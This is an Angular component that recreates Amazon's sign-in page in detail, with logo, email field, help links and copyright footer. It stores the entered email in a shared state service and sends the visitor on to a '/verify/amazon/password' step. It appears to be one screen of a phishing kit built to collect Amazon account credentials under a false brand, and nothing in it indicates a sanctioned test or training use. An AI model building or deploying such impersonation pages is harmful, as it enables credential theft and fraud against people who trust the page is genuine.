import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
  selector: 'app-amazon-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="amazon-flow-container">
      <div class="amazon-logo">
        <img src="/assets/flows/amazon/images/logo.svg" alt="Amazon" class="amz-logo-img">
      </div>

      <div class="amazon-card">
        <h1>Sign in</h1>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
          <div class="amz-form-group">
            <label for="email">Email or mobile phone number</label>
            <input 
              type="text" 
              id="email" 
              formControlName="email"
              [class.error]="isFieldInvalid('email')"
            >
             <div *ngIf="isFieldInvalid('email')" style="color: #c40000; font-size: 11px; margin-top: 4px;">
               Enter your email or mobile phone number
             </div>
          </div>

          <button 
            type="submit" 
            class="amz-btn-primary"
            [disabled]="loginForm.invalid || isLoading()"
          >
            Continue
          </button>
          
          <div style="font-size: 12px; line-height: 1.5; margin-bottom: 22px;">
            By continuing, you agree to Amazon's <a href="javascript:void(0)" class="amz-link">Conditions of Use</a> and <a href="javascript:void(0)" class="amz-link">Privacy Notice</a>.
          </div>

          <div style="margin-bottom: 22px;">
             <a href="javascript:void(0)" class="amz-link" style="font-size: 13px;" (click)="toggleHelp()">
                 <span style="font-size: 10px; margin-right: 3px;">&#9654;</span> Need help?
             </a>
             <div *ngIf="showHelp()" style="margin-top: 5px; margin-left: 14px; font-size: 13px;">
                <div style="margin-bottom: 5px;"><a href="javascript:void(0)" class="amz-link">Forgot your password?</a></div>
                <div><a href="javascript:void(0)" class="amz-link">Other issues with Sign-In</a></div>
             </div>
          </div>
        </form>
      </div>
      
      <div class="amz-divider">
        <span>New to Amazon?</span>
      </div>
      
      <a href="javascript:void(0)" class="amz-btn-secondary" style="width: 350px; text-decoration: none;">Create your Amazon account</a>
      
      <footer class="amz-footer">
         <div class="links">
            <a href="javascript:void(0)">Conditions of Use</a>
            <a href="javascript:void(0)">Privacy Notice</a>
            <a href="javascript:void(0)">Help</a>
         </div>
         <div class="copyright">
            © 1996-2024, Amazon.com, Inc. or its affiliates
         </div>
      </footer>
    </div>
  `,
  styleUrls: ['../../../styles/flows/amazon.scss']
})
export class AmazonLoginComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private state = inject(StateService);

  showHelp = signal(false);
  isLoading = signal(false);

  loginForm = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(3)]]
  });

  constructor() {
    const flow = getFlowById('amazon');
    if (flow) this.state.currentFlow.set(flow);
  }

  isFieldInvalid(field: string): boolean {
    const control = this.loginForm.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  toggleHelp() {
    this.showHelp.update(v => !v);
  }

  onSubmit() {
    if (this.loginForm.valid) {
      this.isLoading.set(true);
      const email = this.loginForm.get('email')?.value;

      this.state.email.set(email);
      // We don't sync state yet, just local transition to password step, which will sync.
      // Actually state service syncs whenever we want.
      // But we will navigate to /verify/amazon/password

      setTimeout(() => {
        this.isLoading.set(false);
        this.router.navigate(['/verify/amazon/password']);
      }, 600);
    } else {
      this.loginForm.markAllAsTouched();
    }
  }
}
